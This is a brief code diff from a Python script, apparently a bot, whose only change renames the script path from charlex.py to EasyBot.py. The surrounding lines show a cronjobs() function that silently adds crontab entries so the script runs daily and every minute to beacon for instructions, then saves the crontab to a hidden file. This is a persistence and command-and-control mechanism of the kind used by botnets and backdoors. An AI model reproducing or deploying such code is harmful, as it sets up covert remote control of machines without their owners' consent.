@@ -10,7 +10,7 @@ import time
 # automatically each day and periodically beacon for instructions.
 #whoami variable ensures that the program will always know where it is  
 def cronjobs():
-	whoami = os.getcwd()+"/charlex.py"
+	whoami = os.getcwd()+"/EasyBot.py"
 	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
 	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
 	croncheck = 'crontab -l > .cron.bot'
